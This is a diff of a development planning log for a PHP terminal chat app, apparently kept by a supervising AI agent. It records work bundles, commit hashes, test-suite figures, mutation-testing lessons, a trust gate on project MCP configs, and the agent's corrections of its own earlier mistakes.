-taken against the real background. Each theme substitutes its own ASSUMED background token, and
-`ansi`'s assumption is pure `#000000`. That assumption is what scores `#6b7280` at 4.34:1.
-
-**The corroborating number is dracula's row: `#6b7280` on `#282a36` is 2.95:1 and already fails.** A
-mid-dark terminal background — the ordinary case — puts that border under 3:1. The user's terminal is
-in that range, which is precisely the reported symptom, and no theme token describes it.
-
-**Consequence for the fix, and it is a prerequisite rather than a nicety:** the contrast assertion
-prescribed above must be evaluated against the RETAINED background, so `observe()` has to keep the RGB
-it is already handed (the `hex()` is right there) instead of collapsing to a bool. Without that the
-test validates the shell against `#000000`/`#0e0e14` fictions and passes on exactly the build the user
-is looking at. **Keep `isDark()` — the boolean has real callers and `adaptive()` needs it — and ADD the
-retained colour beside it.** This is a widening of a live seam, not a rewrite, and it is dormant-code
-wiring of the kind the standing directive protects: the RGB is already arriving.
-
-**A SECOND, INDEPENDENT DEFECT the user's theme choice uncovered.** `Color::ansi(8)` emits
-`\e[90m` — the palette entry the user's terminal actually controls — **only at `ColorProfile::Ansi`**.
-Measured emissions: `Ansi` → `\e[90m`; `Ansi256` → `\e[38;5;244m`; `TrueColor` →
-`\e[38;2;127;127;127m` (`toHex()` `#7f7f7f`). `ColorProfile::detect()` in this environment
-(`TERM=screen-256color`) returns **`Ansi256`**. So the `ansi` theme — whose entire purpose is deferring
-to the terminal's own 16 colours, and which `SprinklesTheme::ansi()` builds exclusively from
-`Color::ansi(0..8)` — is silently up-converted to absolute 256-cube values on any terminal that
-advertises more than 16 colours. **A user selecting `ansi` to make the app match their terminal does
-not get that**, which is why this user's theme choice could not rescue the hardcoded shell. Whether
-that belongs in W3 or in the ledger is an open call; it is a candy-core/profile-policy question, not a
-`src/Tui/` one, so it is probably a separate item — but it must not be lost, because it makes the one
-theme that would otherwise be immune to this whole bug class behave like the others.
-
-**Two lessons, both instances of the chain's dominant defect:**
-
-1. **I measured against the wrong background and reported ratios as if they described the screen.** The
-   domain of every number in the first table is "this theme's declared background token", not "the
-   user's terminal" — and the two differ by exactly the amount that makes the bug visible. §5, and it
-   is the third time this session that a number of mine travelled without its domain.
-2. **A test asserting contrast against a theme token would have inherited the same defect** and shipped
-   green. The prescription "pin the ratio, not the presence" was right and insufficient: pin the ratio
-   **against the retained real background**.
-
-**Ordering:** W3 goes after W2 (it touches `src/Tui/` and `src/Theme.php`, W2 owns `src/Chat.php` and
-`src/Renderer.php` — no file overlap, but the strictly-sequential rule is about suite runs, not files).
-It is a live-bug bundle, so it precedes the audit queue, and `#88` moves behind it for the same reason
-it moved behind W2: W3 will change the suite figure again.
-
-## ✅ BUNDLE B4 NEEDED NO CODE — Phase 5 item 10b was already done
-
-**Measured 2026-08-19 while the W2 agent was still running, read-only, off the files W2 owns.**
-Item 10b asks to differentiate the hardcoded `AgentDefinition` preset prompts, "currently generic
-one-liners that don't even mention the skills they're granted". They are not one-liners.
-`git show bf3495f5 -- src/Agents/AgentDefinition.php` shows the generic one-liners as the `-` side
-of the diff, and that commit's own message says **"Phase 5 items 1, 2, 3 and item 10's preset half."**
-
-Three errors in the plan's own tracking of this item, all in the same direction:
-
-1. **"10b (the preset prompts) untouched"** — written during Bundle B3, which closed 10a, asserting
-   an absence nobody re-measured after Bundle A had closed the other half. `crush_code.md:25` then
-   went further and called the earlier "Phase 5 is finished" note *wrong*; **the earlier note was
-   right and the correction was the error.** §5 in the item tracker rather than in a code comment.
-2. **"the five hardcoded presets"** — there are **six**. `fromType()` builds `coder`, `reviewer`,
-   `debugger`, `architect`, `tester`, `devops`.
-3. The parenthetical is now pinned in **both** directions, which is more than the item asked for:
-   `AgentDefinitionTest::testEveryPresetNamesEverySkillItIsGranted` (a granted skill the prompt
-   forgets) and `::testNoPresetPromptNamesASkillItIsNotGranted` (a prompt that tells a sub-agent to
-   consult a skill it was never handed). The second reads the skill universe off
-   `SkillLoader::loadBuiltInSkills()` instead of a literal list, so a skill added under
-   `src/Skills/BuiltIn/` is covered the moment it exists.
+### a queue row is not evidence — every bundle's measure step re-derives the defect from the source
+*(was B4 block, lines 6217–6222 (item 40))*
 
 **The transferable rule, and it is the workflow's step 1 for a reason:** a queue row is not evidence.
 This is the second time in this plan that "verify before writing" turned a bundle into a no-op — the
@@ -6221,121 +1155,20 @@ measure step must re-derive the defect from the source, and a bundle whose defec
 must be reported as closed rather than re-implemented.** An agent handed "differentiate the prompts"
 with no measure step would have rewritten six perfectly good prompts and called it progress.
 
-## 📏 C5 IS MEASURED — Phase 4 item 6, and one of its four parts is already done
+### never git-mutate in a non-commit step
+*(was THE WORKFLOW, line 6314 (item 41))*
 
-**Read-only inventory, 2026-08-19.** The item bundles four unrelated changes; they are not equally
-real.
+- **Never** `git stash`/`checkout`/`reset`/`commit`/`clean` in a non-commit step. **Never**
 
-| part | measured state |
-|---|---|
-| subcommands `mcp list`, `session list`/`delete`, `models`, `doctor`, `completion bash\|zsh\|fish` | **absent.** `run` is the ONLY subcommand — `ArgvParser.php:140`, `if ($arg === 'run' && !$promptRequested)`, an alias for `-p` |
-| `--config <path>` | **absent** from the parser entirely; no `--config` token in `ArgvParser.php` |
-| a 0/1/2 exit-code convention | **ALREADY DONE**, and thoroughly — `bin/sugarcrush` documents 2 = "nothing was attempted and a retry cannot help" at five separate exits, with 1 reserved for "ran and failed" |
-| warn-not-silently-drop on unrecognised `--output-format` | **REAL DEFECT.** `NonInteractive.php:507` states it in its own docblock: *"Any value other than `self::FORMAT_JSON` falls back to plain text."* `--output-format xml` gets text, silently, exit 0 |
+### if a workflow run reports green and a personal run disagrees, believe the personal run
+*(was THE WORKFLOW, lines 6282–6284 (item 41))*
 
-So C5 is three parts of work, not four. The `--output-format` half is the sharpest and the smallest:
-the value is accepted verbatim by `ArgvParser` (`:208` `substr($arg, 16)`, `:215` `$argv[++$i]`) and
-then compared for equality against `FORMAT_JSON` in three places (`:388` `emitErrorDocument`, `:524`
-`format`), so an unrecognised value is not merely unvalidated — it is *indistinguishable from `text`*
-at every consumer. Validation belongs in the parser (one place, before any dispatch), which is also
-where `usageError` already lives, so it can reuse the exit-2 usage path rather than inventing a
-warning channel.
-
-**A trap for whoever implements the subcommands:** `bin/sugarcrush` parses argv and dispatches
-`--help`/`--version` **before** touching `Bootstrap` or `Program`, deliberately, so they answer on a
-machine with no provider, no config and no TTY. Every new subcommand is in that same class and must
-dispatch in the same place — `mcp list` and `doctor` that open the alt-screen would be Phase 0
-item 3's bug all over again. `doctor` in particular must stay distinct from the model-invoked
-`doctor` tool, which is the wording the item chose on purpose.
-
-## 🤖 THE WORKFLOW — how the rest of the plan gets executed (requested by the user 2026-08-19)
-
-The user asked for a **workflow** to finish the remaining plan, and started it. The script is persisted
-under the session directory and its path is printed in the `Workflow` tool result; a copy of the intent
-lives here so it can be rebuilt from scratch.
-
-### The shape, and why it is this shape
-
-**One bundle at a time, strictly sequential, committing between bundles.** Not because parallelism is
-hard, but because it is measurably wrong here: two uncommitted tracks in one working tree make every
-reviewer flag the other track's diff, and a *suite run* that loads a file another lane is editing shifts
-`file(__FILE__)` ranges against already-loaded reflection and produces phantom failures. Parallelism
-inside a bundle is fine (independent review lenses); parallelism across bundles is not.
-
-Per bundle, the workflow runs the §2 loop as separate agents, because the whole value is that the
-reviewer did not write the code:
-
-1. **measure** — read-only, produces the ground truth the brief will carry. Never trust the plan's line
-   numbers (§9); they are stale by construction and C3 moved `Bootstrap.php` by ~486 lines.
-2. **implement** — against the measured brief only.
-3. **review** — adversarial, on the diff, with a mutation budget. **Separate agent, never skipped.**
-4. **fix** — given the findings.
-5. **re-verify** — a *fresh* agent that re-runs the review's mutations **from their verbatim
-   definitions** and reports which still survive. This step exists because of W1: see the LESSON
-   section above. Three "it's dead" reports in one bundle were false.
-6. **commit** — only after the full suite is green, only that bundle's paths.
-
-### The one honest compromise
-
-Up to now **the supervisor ran the full suite personally at every gate** and that is what caught four
-false kills in W1. A workflow cannot do that — step 5 is the substitute, and it is weaker: it is another
 agent, not me. **So after each workflow run returns, re-run the suite yourself and spot-check the
 bundle's mutations before trusting the commit.** If a workflow run reports green and a personal run
 disagrees, believe the personal run and treat the whole batch as suspect.
 
-### Bundle order (28 plan items left, grouped)
-
-Docs go LAST among features so they describe what actually got built, and the plugin system is last of
-all per the existing queue note.
-
-| # | bundle | plan items |
-|---|---|---|
-| ~~0~~ | ~~**W2**~~ | **COMMITTED `a8d8ec75`** — 7602/88074/1, 29/29 mutations |
-| ~~0b~~ | ~~**W3**~~ | **COMMITTED `6c1e51c8` + `fe7ce954`** — shell themed, bg RGB retained, ansi emits ansi |
-| ~~0c~~ | ~~**W4**~~ | **COMMITTED `3bc51735`** — Tab completes the highlighted `/` command |
-| ~~0d~~ | ~~**W5**~~ | **COMMITTED `f8fd9cfa`** — the `print`-returns-int fatal in three commands |
-| ~~1~~ | ~~**B4**~~ | **DROPPED — already done** by Bundle A (`bf3495f5`), measured 2026-08-19. No code. Phase 5 is closed |
-| 2 | **C5** | Phase 4 item **6** — split into **C5a** (`--output-format` validation + `--config`) and **C5b** (real subcommands). **RUNNING** under `wf_85ae4115-4fe`. The exit-code convention part is ALREADY DONE |
-| 3 | **C4a** | Phase 2 item 4 part 1 — wire `CommandLoader` as an instance into `Chat`; `$ARGUMENTS`/`$1..$9`. **RUNNING** under `wf_85ae4115-4fe` |
-| 4 | **C4b** | Phase 2 item 4 part 2 — `` !`cmd` `` (ReactPHP `Process`) + `@file` |
-| 5 | **C6** | Phase 2 item **7** — WRITE `LspTool implements Tool` over the existing `src/LSP/LspClient.php` |
-| 6 | **D** | Phase 3 items **2-5** — `candy-focus\FocusRing` in `Tui\Pane`; `sugar-veil` |
-| 7 | **E** | Phase 6 items **1-6** — item 1's `__DIR__` bug is largely already fixed; verify before writing |
-| 8 | **G1/G2** | Phase 8 items **3, 4, 6, 8, 9, 10, 11, 13, 15** — split into two bundles |
-| 9 | **F** | Phase 7 items **3-6** — authoring/reference docs |
-| 10 | **C7** | Phase 2 item **9** — unified `crush-plugin.json` + `PluginLoader`. Explicitly last |
-| 11 | **#88** | the stale README suite figure — standalone, nothing else in flight |
-| 12 | **hardening** | `crush_code_hardening_backlog.md` E1-E50. LAST, per the user's standing directive |
-
-### Non-negotiables every workflow agent must be handed
-
-These are not style preferences; each one is a bug this project already had.
-
-- **Never** `git stash`/`checkout`/`reset`/`commit`/`clean` in a non-commit step. **Never**
-  `composer install`/`update` (it silently replaces `vendor/sugarcraft/*` symlinks with Packagist copies
-  — the only signal is the skip count going 1 → 2). **Never** a global `pkill`. **Never** `caliber`.
-- **Skips must be exactly 1.** A 2-skip run is not testing the monorepo and its figures are void.
-- Judge by `$?`, never the banner; **redirect, never pipe** (`phpunit | tail` reports `tail`'s code);
-  never run `tests/Cli` as a DIRECTORY (hangs >4 min), single FILES are ~0.05s; full suite needs a
-  **600000ms** timeout.
-- **Defer the FIX, never the FINDING** — every deferred security item goes in the backlog with its probe.
-- **Never delete dormant code** — wire it or document it as an intentional seam.
-- **Write mutation definitions as the exact edit, verbatim.** "MU11" is not a definition.
-- Adding a `src/*.php` file moves **five** censuses; update all five in the same diff.
-
-### Chaining
-
-The size guideline here is ~15 agents per run, and a full bundle is 6, so a run covers **2-3 bundles**.
-Invoke with the next batch, read the result, re-verify personally, then invoke again. Do not try to put
-all twelve bundles in one run.
-
-## ORDER: W1 ✅ → W2 ✅ → W5 ✅ → W3 ✅ → W4 ✅ → C5 → C4a → … → `#88` → hardening
-
-`#88` is the stale README suite figure. **Moved to AFTER the live-bug bundles, not straight after W1**,
-and for a measurable reason: the figure has now been invalidated three times in one session (7,276 →
-7,387 → 7,512) and W2 will move it again. Writing it between two bundles guarantees writing it wrong.
-Take it from the verification run of the last live-bug commit, in a standalone commit with nothing else
-in flight.
+### the README:551 trap — a deliberate historical citation, do not "fix" it
+*(was ORDER block, lines 6340–6345 (item 42))*
 
 **Prepared edit: `/tmp/…/scratchpad/88-readme-figure.md`.** Read it first — it corrects an error in my
 own earlier note here. That note said `README.md:551` carries a second stale figure, `4,337/12,587`.
@@ -6344,26 +1177,8 @@ the first figure to stand here …" and is a deliberate historical citation kept
 Updating it destroys the point it makes. Only `:531`'s figure is live — plus its runtime and its
 delta sentence, both of which are part of the measurement rather than decoration.
 
-## BUNDLE C3 IS COMMITTED — `3b0ba8fe`. Phase 2 item 2 done.
-
-Supervisor-verified TWICE, and the second run is the one that counts: **7387 / 76813 / 1, exit 0
-against LOCAL sibling symlinks** (and 7387 / 76811 / 2 against Packagist copies — see the vendor
-note below for why the two differ). Implementation + adversarial review (17 findings, 5 surviving
-mutations) + two fix rounds. `src/` is **276** files.
-
-**The security defect is closed, and I verified it myself rather than taking the agent's word.**
-`.mcp.json` now requires the root to be listed under `trustedProjectMcp` in the user's own
-`~/.sugar-crush/config.json`. Measured personally, three ways: untrusted root in `plan` → payload
-never runs; untrusted in `default` → never runs; **grant written → runs** (the positive control
-matters — a gate that simply broke MCP would also show "no payload" and would have looked like a
-pass). The refusal is visible through the real `chat()` path, naming the root and the key to add.
-
-Findings 6, 7, 10-14 landed in fix round B, plus two hand-offs: the `error_log()` diagnostic is now
-asserted rather than silenced, and the `projectTierRefusals()` count got its missing domain — "TEN"
-is true of dot-DIRECTORY paths, and `.mcp.json` is a bare dot-file the derivation cannot see, so
-the figure a reader wants is **EIGHT** paths feeding that map.
-
-**Two things fix round B reported and deliberately did not change — both still open, my call:**
+### the dead arm is the fail-CLOSED direction on a security gate — keep it, document it as belt-and-braces
+*(was C3 block, lines 6368–6373 (item 43))*
 
 1. `mcpClient()`'s untrusted branch is guarded `$canonicalRoot === false || !projectMcpIsTrusted(…)`,
    and the `false` arm is **unreachable** there (`is_file()` already succeeded on a path composed
@@ -6371,110 +1186,9 @@ the figure a reader wants is **EIGHT** paths feeding that map.
    dead arm is the fail-CLOSED direction on a security gate. **Decision: keep it, document it as
    deliberate belt-and-braces.** A later reader deleting it "because it is unreachable" is exactly
    how a gate acquires a hole, and the cost of keeping it is one branch.
-2. Neither refusal branch writes `$mcpClients`, so an untrusted root re-stats and re-checks trust on
-   every `tools()` call. Harmless and idempotent; the memo docblock reads as if every outcome is
-   cached, which is the claim to correct, not the behaviour.
 
-## ⚠️ VENDOR STATE IS NOW A THING TO CHECK, and it silently changes what "green" means
-
-Mid-round, something ran `composer update` and replaced `sugar-crush/vendor/sugarcraft/*`'s
-symlinks with real Packagist directories — so the suite stopped testing the monorepo's own
-`candy-*` and started testing published copies, with no signal except a skip count moving 1 → 2
-(`GitignoreAwarenessTest::testTheMonorepoPathRepoSymlinksAreNotFollowed` self-skips when there are
-no symlinks). **A 2-skip run means you are not testing the monorepo.** It also left an unrelated
-third-party bump in the tracked root `composer.lock` (aws-sdk 3.390.4 → 3.393.1 and others), which
-I reverted rather than letting it ride along inside a feature commit.
-
-Restore local wiring with the documented loop, and note it is `sugarcraft/*` scoped so third-party
-versions do not move:
-
-    php tools/check-path-repos.php --fix --strict-closure
-    cd sugar-crush && composer update 'sugarcraft/*' --quiet
-    cd .. && git checkout -- '*/composer.json'      # NEVER commit these
-    php tools/check-path-repos.php --no-lib-path-repos   # must exit 0
-
-`vendor/` is gitignored, so reverting the manifests keeps the symlinks AND a clean tree. **Tell
-every agent not to run `composer install`/`update`** — it silently undoes this.
-
-## THE `#N` TRACKER IS crush_code.md RENUMBERED — it adds nothing to the count
-
-**Settled by the user, then verified in the worklog. Do not re-run this archaeology.**
-
-The worklog is full of `#11`-`#90` references, and I mistook them for a second plan with a lost
-defining document (I even inferred `crush_feat_plan.md:81`'s uncommitted `crush_code_update.md` as
-the source). **Wrong.** There was never a plan beyond `crush_code.md` and this worklog. The `#N`
-numbers are a FLAT TRACKER over `crush_code.md`'s own items, extended with new numbers as problems
-were discovered — and the mapping is written down in the worklog itself:
-
-    :195   #12 (`McpClient` rename)  -> P2.1 + the Bootstrap::mcpClient() half
-    :194   #31 (P6.2 layered settings)
-    :3417  "#17 / P2.7"              -> LspTool over the built LspClient
-    :~194  #13 (P2.3 workflow wiring)
-           "#14/#16/#17 — the rest of Phase 2 wiring"
-
-So `#12`/`#13` are CLOSED (C1, C2, C3), `#14`/`#16` are Phase 2 items already inside the 28, and
-`#17` is Phase 2 item 7. **The `#N` tail I reported as "unrecoverable" was Phase 2 wiring I was
-already executing.** Discovered items went on to become the `E1`-`E45` backlog, which is the live
-second series.
-
-**Two lessons, both mine, both in this section's own history:**
-
-- **I answered "how far along is the plan" by counting one series and calling it "the plan".** The
-  user knew the number was wrong (~88-90) before I did.
-- **I then explained the discrepancy with a missing-file theory built from an absence**, when the
-  mapping was in the file I was already reading. An inference from "I cannot find X" is not
-  evidence about X. Check for the notation before positing the document.
-
-### The one genuine straggler, and it is not a plan item
-
-**`#88` — the README whole-suite figure, OPEN.** `sugar-crush/README.md:531` says
-"7,276 tests / 76,239 assertions" (bundle C1's number, `6bc5218b`); the tree is at 7,387 / 76,813.
-`:551` carries a separate `4,337/12,587`. Update it AFTER W1 lands, in a standalone commit, once
-nothing else is in flight — a figure committed mid-bundle is stale before it is pushed.
-
-**`#63` `enforceTimeLimit` — CLOSED, and the worklog's "still waiting for a window" note is stale.**
-I recorded it OPEN here from the worklog rather than the file and corrected it minutes later.
-`phpunit.xml` already carries `enforceTimeLimit="true"` + `defaultTimeLimit="60"` with `php-invoker`
-installed, plus 55 lines of measured reasoning: 60s sits ~6x above the slowest real test (9.321s,
-`WebSearchToolTest::testHandlesRedirectResponse`); `memory_limit` is set because the limit bounds
-TIME SPENT COMPUTING and not a thrashing process (a real `tokenize()` mutant ran past 600s at >4GB
-RSS emitting one progress character in ten minutes); `failOnRisky` is what makes it bite, since a
-timed-out test is recorded RISKY and risky alone exits 0. Accepted gap:
-`tests/Agents/AgentWorkerPoolTest.php` arms and cancels `pcntl_alarm()` itself, and its
-`pcntl_alarm(0)` clears the enforcing alarm. **Verify a "waiting" note against the file before
-repeating it.**
-
-`#89` (InstructionFileLoader containment — five escapes, not one) and `#90` (`BuiltInToolCorpus`
-blindness, whose closure unblocked `#17`) are both CLOSED per worklog `:4646` and `:4769`.
-
-### THE LIVE SERIES ARE TWO
-
-1. **`crush_code.md`** — 75 numbered items across 9 phases, unchanged since `418c0888`. **47 done,
-   28 left.** Verified by counting the plan section bounded at its `## Appendix` heading; an unbounded
-   awk attributes every numbered line in the 2,000-line appendix to Phase 8 and reports 202.
-2. **`crush_code_hardening_backlog.md`** — `E1`-`E45`, deferred to the end by the user's own rule.
-   Note `crush_code.md:129` claims "50 items across 6 groups" against 45 actual entries — an
-   unreconciled count that needs its domain like everything else.
-
-## THE COUNT, and two items that had fallen out of the queue
-
-**47 of 75 plan items complete (63%), 28 left.** Counted by item from `crush_code.md`'s phase
-sections: Phase 0=14, 1=3, 2=9, 3=5, 4=7, 5=10, 6=6, 7=6, 8=15.
-
-Two corrections the arithmetic forced, both of them errors in THIS file:
-
-- **"PHASE 5 IS COMPLETE" was wrong.** Item **10b** — differentiate the five hardcoded
-  `AgentDefinition` preset prompts, currently generic one-liners that do not mention the skills
-  they grant — is untouched. B3 shipped 10a (the `EnvironmentBlock` OS-version line) only.
-  Phase 5 is items 1-9 + 10a.
-- **Phase 4 item 6 was missing from the queue entirely.** Real subcommands (`mcp list`,
-  `session list`/`delete`, `models`, `doctor`, `completion bash|zsh|fish`), `--config <path>`, a
-  0/1/2 exit-code convention, and warn-not-silently-drop on an unrecognised `--output-format`.
-  Never done, just absent from §11.
-
-The item count is not effort. Phase 2 item 4 alone is bigger than all of Phase 7; Phase 8's nine
-remaining items are mostly small. And the hardening backlog (E1-E42, and growing as rounds land) is
-a SECOND queue, deliberately held to the end.
+### the five lessons of the C1/E21 era (item 45)
+*(was lines 6479–6504)*
 
 **The two lessons this session added, both from C1:**
 
@@ -6503,178 +1217,36 @@ Older but still live: **"survives the full suite" is not "is correct" — it is 
 measures this"**, and **a fix lifted from a reviewer's mutation is still a mutation**, chosen
 to probe coverage rather than to be right.
 
-**Historical: Bundle B3 was COMMITTED as `a72c5b0a`** (Phase 5 items 8, 9, 10a), with
-its review and fix rounds done. Supervisor-verified on a clean tree: **7204 / 75944 / 1,
-exit 0**. Worklog section "Bundle B3 — review + fix rounds" carries the nine mutation
-survivors, the one real code bug (`MemoryBlock::MAX_BYTES` was not a ceiling — 11,119 bytes
-measured against a 4,096 budget, with the false promise in the model-facing header), the
-five corrections the fix agent made to the supervisor's brief, and the two review findings
-that were against the supervisor's own backlog rather than the code.
+### C6 timeout exception — a language-server request timeout is NOT an LLM completion timeout
+*(was §11, lines 6653–6655 (item 46))*
 
-**PHASE 5 IS COMPLETE as of 2026-08-19.** E21 committed as `261ac59d`, supervisor-verified at
-**7237 / 76136 / 1, exit 0**. **In flight: C1** (Phase 2 items 1 and 8), implementation round,
-brief at `/tmp/…/scratchpad/c1-brief.md` — self-contained, so re-spawn against it if that round
-was lost. Then review → fix → verify → commit as usual.
-
-**Two lessons from E21 that apply to every round from here:**
-
-1. **"Survives the full suite" is not "is correct" — it is only "nothing measures this".** The
-   `groupIntoPairs()` fix the supervisor prescribed came from a reviewer's mutation that
-   survived all 7221 tests. Measured, it took `exchangesToSummarize()` from 10 exchanges to 0
-   on any history with a reminder after each prompt — i.e. **every session that reaches 85%,
-   since 70% fires first** — which would have made E21 fall back to the heuristic forever,
-   silently, while looking wired. A fix prescribed from a mutation is still a mutation: chosen
-   to probe coverage, not to be right.
-2. **`ContextCompactor` had four victims, not the one the implementation round reported.** The
-   unreported one: two consecutive assistant turns, where the second **overwrote** the first —
-   and `/compact`'s landing report, the spend-cap refusal and the 95% refusal all append an
-   assistant message onto a history already ending in one. All four fixed in `261ac59d`.
-
-**PENDING EDIT TO `crush_code.md`, deliberately not yet made.** Its status block's
-`**Complete:**` line reads "Phase 2 item 6" and must also list **Phase 2 items 3 and 5**,
-which §9 records as measured already-done with no code required. E21's agent already updated
-the Phase 5 half of that block, so item 6 and "Phase 5 items 1-7" are correct as they stand.
-The edit is held back only because **C1's agent is live in `crush_code.md`** (it will mark
-items 1 and 8) and a second writer there loses one of the two edits. Make it once C1 commits.
-
-**C1's in-flight state, for recovery.** As of this note the working tree carries two
-completed renames and nothing else: `sugar-crush/src/McpClient.php` →
-`src/ClaudeCodeMcpClient.php` and `tests/McpClientTest.php` → `tests/ClaudeCodeMcpClientTest.php`
-(both showing as `RM` in `git status`). If that round was lost mid-flight, the brief at
-`/tmp/…/scratchpad/c1-brief.md` is self-contained — re-spawn against it; it is safe to re-run
-over a tree where the renames already happened, but check whether the class and namespace
-inside those two files were renamed too before assuming the item is half-done.
-
-
-## 11. QUEUE — in order
-
-> 🔴 **STALE — FROZEN around round 35. This is NOT the queue.** The live queue is §0-NOW-62 §6
-> (round 61's three ranked lanes) and §8 (the path to completion). Every row below is either landed
-> or superseded by a backlog entry; kept for the per-bundle reasoning and the withdrawn-claim record,
-> which several later entries cite.
-
-- ~~**B1** Phase 5 items 4,5 — provider `contextWindow()` wiring + live 85%/95%
-  compaction tiers.~~ **DONE `08cc1b6a`** (6931/71073/1, exit 0).
-- ~~**B2** Phase 5 items 6,7~~ **DONE `738c586c`** (7089/75695/1, exit 0). Item 7
-  complete; **item 6 is 🟡 partial** — `/compact` asks the model, the automatic 85% tier
-  still uses the heuristic (backlog E21), which is the lossier path and where most real
-  compactions happen. Pick E21 up before calling Phase 5 finished.
-- ~~**B3** Phase 5 items 8,9,10a.~~ **DONE `a72c5b0a`** (7204/75944/1, exit 0).
-- ~~**E21** — finish Phase 5 (wire the automatic 85% tier to the model).~~ **DONE `261ac59d`**
-  (7237/76136/1, exit 0). It also fixed four silent-loss bugs in
-  `ContextCompactor::groupIntoPairs()` and one spend-cap bypass it had itself introduced.
-  **This row used to claim "PHASE 5 IS COMPLETE". That was wrong** — item **10b** (the five
-  preset prompts) is untouched, so Phase 5 is items 1-9 + 10a. See §10's count.
-- ~~**E33** — the 70% reminder piling up in permanent history.~~ **DONE `7ed551b6`**
-  (7285/76294/1, exit 0). Deduplicated: strip unconditionally, append only when the tier fires.
-  Also fixed a bug the review found and I had not thought to look for — **`/rewind` was
-  reconstructing every non-`assistant` checkpoint row as a USER message**, so a rewound reminder
-  came back as the user's own words on the provider wire, and the dedup's own role guard made it
-  permanent. Same coercion mis-roled `_Request cancelled._`, the tier report and
-  `_Permission denied_`. Fixed with a `'system'` arm, zero fixture churn. The `tool` case stays
-  coerced **by necessity** — `Role` has three cases and no `tool`, and nothing serialises one.
-  Residual: **E38** (a compaction folds the reminder's full text into a `[summary] ` line the
-  dedup cannot match, so the pile-up changes shape rather than ending).
-- ~~**C1** Phase 2 items 1,8 — the `ClaudeCodeMcpClient` rename and the streaming tier.~~
-  **DONE `6bc5218b`** (7276/76239/1, exit 0). Item 8 carried far more than the plan said: the
-  dormant class **could not return a newline from any command whatsoever**, so five doc sites
-  were recommending a wrapper that cannot exist. Resolved by making a terminated blank line
-  mean a literal newline. Also fixed an unbounded 100%-CPU spin, an escape hatch a
-  `trap '' TERM` child held for 8s against a 1s deadline, and `CommandBackend` returning an
-  EMPTY answer whenever the whole reply was `0` (`?: ''`). **Two claims withdrawn, not
-  delivered:** `$onToken` fires but the blocked loop means nothing paints it — measured six
-  callbacks, ZERO render ticks. Backlog **E34** (non-blocking rewrite) and **E35**
-  (cancellation) carry the remainder. That is the bundle's one FUNCTIONAL deferral and it is
-  deliberate.
-- ~~**C2** Phase 2 item 3 — `WorkflowEngine`/`WorkflowRegistry` in `Bootstrap::chat()`.~~
-  **ALREADY DONE** — `Bootstrap.php:374` passes it. Measured 2026-08-19, see §9. No work.
-- ~~**C3** Phase 2 item 2 — MCP tools reachable.~~ **DONE `3b0ba8fe`** (7387/76813/1, exit 0
-  against local siblings). Three rounds: implement, adversarial review, two fix rounds. The
-  headline is not the wiring but the gate — see §10. `trustedProjectMcp` is a NEW key, verified by
-  me in all three directions including the positive control. E40/E41/E42 carry the deferred
-  remainder.
-- ~~**W1** — the user's live render bug: long replies cut off at the pane edge.~~ **DONE `47ee2c86`**
-  (7577 / 87648 / 1, exit 0). Four rounds. Twelve of twelve mutations killed, re-verified by me.
-  **Read the "LESSON FROM W1" section above before running any later bundle** — three separate "it's
-  dead" reports in this one chain were false, and a fix round made its neighbours' assertions vacuous.
-- **W2 — IN FLIGHT: input is blocked while a turn runs. USER-REPORTED, ahead of the audit queue.**
-  Typing and Ctrl+P are both dead mid-turn, and the input cursor is hidden as well. **Not an async
-  problem — the async work is already done** (`completeAsync()` forks a child; a driven `Escape`
-  mutates state mid-turn, proving the loop delivers keys). The defect is one policy return,
-  `Chat.php:1141-1146`'s blanket `if ($this->inFlight)` swallow. Do NOT delete it — split it, and make
-  **Enter enqueue** rather than dispatch. The drain must go through the existing turn-start path
-  (`dispatchTurn()` has two callers and its docblock warns a third copy loses the generation stamp, the
-  cancellation token, the checkpoint or the title Cmd); `scheduleParkedCompaction()` already implements
-  hold-then-dispatch for the 85% tier. **One real drain site, not 21** — see the W2 section above.
-- ~~**Phase 5 item 10b**~~ — **ALREADY DONE, no code written.** Closed by Bundle A (`bf3495f5`),
-  measured 2026-08-19. The row said "it is what stops Phase 5 being finished"; nothing did.
-- **Phase 4 item 6** — real subcommands (`mcp list`, `session list`/`delete`, `models`, `doctor`
-  health-check distinct from the model-invoked tool, `completion bash|zsh|fish`), `--config <path>`,
-  a 0/1/2 exit-code convention, warn-not-silently-drop on an unrecognised `--output-format`. **This
-  row was missing from the queue entirely** until the item arithmetic caught it.
-- **C4** Phase 2 item 4 — **the biggest remaining item.** Wire `CommandLoader::loadAll()`
-  AND build the missing template-substitution engine (`$ARGUMENTS`, `$1`, backtick-cmd,
-  `@file` — none exist; a `grep -rn ARGUMENTS src/` returns three hits, all unrelated prose).
-  Shell-out must use ReactPHP `Process`, never blocking `shell_exec`. This is what makes the
-  README's "loadable, not loaded" note obsolete.
-  **THE STRUCTURAL BLOCKER THE PLAN DOES NOT MENTION**, measured 2026-08-19, full write-up at
-  `/tmp/…/scratchpad/c4-measured.md`: `CommandRegistry` is **entirely static** — no
-  constructor, no instance state, `all()` returns a hardcoded literal, and
-  `grep -rn 'new CommandRegistry'` returns ZERO. There is no instance for loaded commands to be
-  injected into, so the bundle's FIRST decision is static-merge-point vs instance registry (the
-  latter touches `Renderer::renderSlashMenu()`, the palette, and the two tests below), not
-  template syntax.
-  **AND TWO INVENTORY TESTS WILL RED IN A MISLEADING WAY**, both in
-  `tests/Commands/SlashDispatchTest.php`. `testEverySlashVisibleRegistryRowHasALiveDispatchHandler()`
-  (:98) asserts **`$next->inFlight === false`** for every slash-visible row — but a file-based
-  command MUST set `inFlight = true`, because sending its template to the model IS its
-  behaviour. Its failure message will tell the implementer to add a dispatch arm, which is the
-  wrong remedy. `testEveryDispatchArmIsAdvertisedOrDeliberatelyUnadvertised()` (:158) derives
-  arm names from `dispatchCommand()`'s own SOURCE and needs the same third case. **Do not let
-  either be relaxed** — both are load-bearing completeness inventories; teach them that a
-  file-based row dispatches to the model by design and assert that positively.
-  `CommandSpec::isFileBased()` already exists to express it. Also: `CommandLoader`'s class
-  docblock defers this work because "`src/Chat.php` is owned by a concurrent track" — **that is
-  now STALE** and should be corrected as part of the bundle.
-- ~~**C5** Phase 2 item 5 — `HookManager::loadFromFile()` in `Bootstrap::hooks()`.~~
-  **ALREADY DONE, and deliberately not by the route the plan names** — `Bootstrap::hooks()`
-  loads entries once per process so a session cannot install hooks into itself mid-session.
-  The prerequisite checks out too (`df0a563b` is Phase 1 item 2; `ScriptHook::EXIT_ASK = 3`).
-  Measured 2026-08-19, see §9. No work.
-- **C6** Phase 2 item 7 — **write** `LspTool implements Tool` over `src/LSP/LspClient.php`.
